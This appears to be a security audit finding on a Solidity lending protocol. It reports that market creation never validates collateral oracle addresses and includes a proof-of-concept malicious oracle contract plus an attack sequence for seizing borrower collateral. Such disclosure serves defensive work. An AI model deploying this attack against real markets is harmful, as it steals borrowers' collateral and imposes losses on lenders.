### Title
Unvalidated Oracle Address in `CollateralParams` Allows Malicious Market Creation to Drain Borrower Collateral — (File: `src/Midnight.sol`)

---

### Summary

`touchMarket()` in `src/Midnight.sol` validates collateral token ordering, LLTV, and `maxLif`, but performs **no validation on the `oracle` address** inside each `CollateralParams`. Any address — including an attacker-controlled contract — can be registered as an oracle. An attacker can permissionlessly create a market with a manipulable oracle, attract borrowers into it, then flip the oracle price to zero to make every position instantly liquidatable and seize all collateral.

---

### Finding Description

**Root cause — `touchMarket()` does not validate `oracle`:** [1](#0-0) 

The loop at lines 762–773 checks:
- collateral token ordering (ascending, no duplicates)
- `lltv` is in the allowed set
- `maxLif` matches one of two permitted formulas

It never checks `market.collateralParams[i].oracle`. Any address passes.

**Oracle is called without any trust check in `isHealthy()` and `liquidate()`:** [2](#0-1) [3](#0-2) 

Both call `IOracle(_collateralParam.oracle).price()` unconditionally. A malicious oracle can return any `uint256`.

**`IOracle` interface is a single-function interface with no authentication:** [4](#0-3) 

**Market ID is derived from the full `Market` struct including oracle addresses:** [5](#0-4) 

This means an attacker can create a market whose parameters (loan token, collateral token, maturity, LLTV, maxLif) are identical to a well-known legitimate market, but with a different `oracle` address — producing a different market ID that users may not scrutinize.

---

### Impact Explanation

**Direct theft of borrower collateral.**

1. Attacker deploys `MaliciousOracle` that returns a high price initially (e.g., `1e36`) and can be switched to `1` by the attacker at will.
2. Attacker calls `touchMarket()` with a `Market` struct that clones a popular market's parameters but substitutes `MaliciousOracle` for the real oracle.
3. Attacker posts attractive sell offers (low tick / high implied rate) in the malicious market to draw in borrowers.
4. Victims call `take()` on those offers, opening debt positions and supplying collateral.
5. Attacker calls `MaliciousOracle.setPrice(1)`.
6. Every borrower's `maxDebt` collapses to near zero; all positions are immediately liquidatable.
7. Attacker calls `liquidate()` on each victim, seizing 100% of their collateral for a trivial repayment.

The `liquidate()` path also socializes bad debt via `lossFactor`, so lenders in the same market suffer losses too. [6](#0-5) [7](#0-6) 

---

### Likelihood Explanation

- **No privileged access required.** `touchMarket()` is permissionless; any EOA can create the malicious market.
- **Low cost.** Only gas is needed to deploy the oracle and create the market.
- **Realistic victim path.** Users and integrating protocols typically verify the loan token and collateral token, not the oracle address. A market cloning a well-known pair (e.g., USDC/WETH, same maturity, same LLTV) with a swapped oracle is indistinguishable at a glance. Front-ends that display only token symbols provide no protection.
- **Analogous to the Perennial M-01 finding**, which was rated Medium precisely because the design allows permissionless creation but the risk is real and low-hanging to exploit.

---

### Recommendation

Add an oracle allowlist or registry check inside `touchMarket()`. For each `CollateralParams`, require that the oracle address is in a protocol-maintained whitelist before the market is created:

```solidity
// In touchMarket(), inside the collateralParams loop:
require(isOracleAllowed[market.collateralParams[i].oracle], OracleNotAllowed());
```

Alternatively, require that the oracle implements a verifiable interface (e.g., returns a non-zero price at creation time and is registered by a trusted deployer), consistent with how `lltv` and `maxLif` are already constrained to a finite allowed set. [8](#0-7) 

---

### Proof of Concept

```solidity
// MaliciousOracle.sol
contract MaliciousOracle {
    uint256 public _price = 1e36; // initially high
    address owner;
    constructor() { owner = msg.sender; }
    function setPrice(uint256 p) external { require(msg.sender == owner); _price = p; }
    function price() external view returns (uint256) { return _price; }
}

// Attack sequence (pseudo-code):
MaliciousOracle oracle = new MaliciousOracle();

CollateralParams[] memory cp = new CollateralParams[](1);
cp[0] = CollateralParams({
    token:   WETH,
    lltv:    0.8e18,          // allowed value
    maxLif:  maxLif(0.8e18, LIQUIDATION_CURSOR_LOW), // passes InvalidMaxLif check
    oracle:  address(oracle)  // ← malicious, not validated
});

Market memory m = Market({
    loanToken:       USDC,
    collateralParams: cp,
    maturity:        block.timestamp + 30 days,
    rcfThreshold:    1e18,
    enterGate:       address(0),
    liquidatorGate:  address(0)
});

midnight.touchMarket(m);          // market created, no oracle check

// Post attractive sell offers → victims take them, supply WETH collateral, accrue debt

oracle.setPrice(1);               // collapse oracle price

midnight.liquidate(m, 0, 0, victimDebt, victim, false, attacker, address(0), "");
// attacker receives victim's WETH collateral
``` [1](#0-0) [9](#0-8)

### Citations

**File:** src/Midnight.sol (L592-624)
```text
        bytes32 id = touchMarket(market);
        MarketState storage _marketState = marketState[id];
        Position storage _position = position[id][borrower];
        require(UtilsLib.atMostOneNonZero(repaidUnits, seizedAssets), InconsistentInput());
        require(_position.debt > 0, NotBorrower()); // to avoid no-op liquidations of non borrower positions.
        require(
            market.liquidatorGate == address(0) || ILiquidatorGate(market.liquidatorGate).canLiquidate(msg.sender),
            LiquidatorGatedFromLiquidating()
        );

        uint256 maxDebt;
        uint256 liquidatedCollatPrice;
        uint256 originalDebt = _position.debt;
        uint256 badDebt = originalDebt;
        uint128 _collateralBitmap = _position.collateralBitmap;
        while (_collateralBitmap != 0) {
            uint256 i = UtilsLib.msb(_collateralBitmap);
            CollateralParams memory _collateralParam = market.collateralParams[i];
            uint256 price = IOracle(_collateralParam.oracle).price();
            if (i == collateralIndex) liquidatedCollatPrice = price;
            uint256 _collateral = _position.collateral[i];
            maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE).mulDivDown(_collateralParam.lltv, WAD);
            badDebt = badDebt.zeroFloorSub(
                _collateral.mulDivUp(price, ORACLE_PRICE_SCALE).mulDivUp(WAD, _collateralParam.maxLif)
            );
            _collateralBitmap = _collateralBitmap.clearBit(i);
        }

        require(
            !liquidationLocked(id, borrower)
                && (postMaturityMode ? block.timestamp > market.maturity : originalDebt > maxDebt),
            NotLiquidatable()
        );
```

**File:** src/Midnight.sol (L626-641)
```text
        if (badDebt > 0) {
            // forge-lint: disable-next-item(unsafe-typecast) as badDebt <= _position.debt
            _position.debt -= uint128(badDebt);
            uint256 _totalUnits = _marketState.totalUnits;
            uint256 _lossFactor = _marketState.lossFactor;
            _marketState.lossFactor = UtilsLib.toUint128(
                type(uint128).max - (type(uint128).max - _lossFactor).mulDivDown(_totalUnits - badDebt, _totalUnits)
            );
            _marketState.totalUnits -= UtilsLib.toUint128(badDebt);
            _marketState.continuousFeeCredit = _lossFactor < type(uint128).max
                ? UtilsLib.toUint128(
                    _marketState.continuousFeeCredit
                        .mulDivDown(type(uint128).max - _marketState.lossFactor, type(uint128).max - _lossFactor)
                )
                : 0;
        }
```

**File:** src/Midnight.sol (L755-791)
```text
    function touchMarket(Market memory market) public returns (bytes32) {
        bytes32 id = toId(market);
        if (marketState[id].tickSpacing == 0) {
            require(market.maturity <= block.timestamp + 100 * 365 days, MaturityTooFar());
            require(market.collateralParams.length > 0, NoCollateralParams());
            require(market.collateralParams.length <= MAX_COLLATERALS, TooManyCollateralParams());
            address previousCollateralToken;
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }

            MarketState storage _marketState = marketState[id];
            _marketState.tickSpacing = DEFAULT_TICK_SPACING;
            uint16[7] memory _defaultSettlementFeeCbp = defaultSettlementFeeCbp[market.loanToken];
            _marketState.settlementFeeCbp0 = _defaultSettlementFeeCbp[0];
            _marketState.settlementFeeCbp1 = _defaultSettlementFeeCbp[1];
            _marketState.settlementFeeCbp2 = _defaultSettlementFeeCbp[2];
            _marketState.settlementFeeCbp3 = _defaultSettlementFeeCbp[3];
            _marketState.settlementFeeCbp4 = _defaultSettlementFeeCbp[4];
            _marketState.settlementFeeCbp5 = _defaultSettlementFeeCbp[5];
            _marketState.settlementFeeCbp6 = _defaultSettlementFeeCbp[6];
            _marketState.continuousFee = defaultContinuousFee[market.loanToken];
            IdLib.storeInCode(market, INITIAL_CHAIN_ID);

            emit EventsLib.MarketCreated(market, id);
        }
        return id;
    }
```

**File:** src/Midnight.sol (L953-953)
```text
                uint256 price = IOracle(collateralParam.oracle).price();
```

**File:** src/interfaces/IOracle.sol (L1-7)
```text
// SPDX-License-Identifier: GPL-2.0-or-later
// Copyright (c) 2025 Morpho Association
pragma solidity >=0.5.0;

interface IOracle {
    function price() external view returns (uint256);
}
```

**File:** src/libraries/IdLib.sol (L25-31)
```text
    function toId(Market memory market, uint256 chainId, address midnight) internal pure returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                uint8(0xff), midnight, chainId, keccak256(abi.encodePacked(SSTORE2_PREFIX, abi.encode(market)))
            )
        );
    }
```
